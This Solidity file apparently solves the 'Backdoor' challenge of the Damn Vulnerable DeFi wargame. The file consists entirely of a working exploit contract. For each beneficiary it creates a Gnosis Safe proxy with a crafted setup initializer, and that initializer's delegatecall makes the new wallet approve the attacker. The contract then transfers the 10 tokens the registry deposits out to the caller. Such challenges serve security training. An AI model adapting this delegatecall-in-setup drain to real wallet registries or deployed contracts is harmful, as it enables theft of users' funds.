// SPDX-License-Identifier: MIT

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import "../DamnValuableToken.sol";

contract AttackBackdoor {
    address public masterCopy;
    address public walletFactory;
    address public token;
    address public walletRegistry;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _token,
        address _walletRegistry
    ) {
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        token = _token;
        walletRegistry = _walletRegistry;
    }

    //will be called by the newly deployed GnosisSafeProxy which will approve our contract to transfer 10 DVT
    function approveToken(address _token, address _attacker) external {
        DamnValuableToken(_token).approve(_attacker, 10 ether);
    }

    function attack(address[] memory users) external {
        //repeat the same for each users
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory user = new address[](1);
            user[0] = users[i];

            //create the payload for the delegate call in setup()
            bytes memory payloadForSetup = abi.encodeWithSignature(
                "approveToken(address,address)",
                token,
                address(this)
            );
            // create initializer calldata
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                user, // owner (WalletRegistry require 1 owner)
                1, //_threslhold (WalletRegistry require threslhols of 1)
                address(this), // to (receive the delegate call)
                payloadForSetup, //data (delegate call payload)
                address(0),
                address(0),
                0,
                address(0)
            );

            // create the GnosisSafeProxy (will call setup, our approveToken function and finally WalletRegistry::proxyCreated)
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    masterCopy,
                    initializer,
                    0,
                    IProxyCreationCallback(walletRegistry)
                );

            //transfer the DVT token to the attacker
            DamnValuableToken(token).transferFrom(
                address(proxy),
                msg.sender,
                10 ether
            );
        }
    }
}
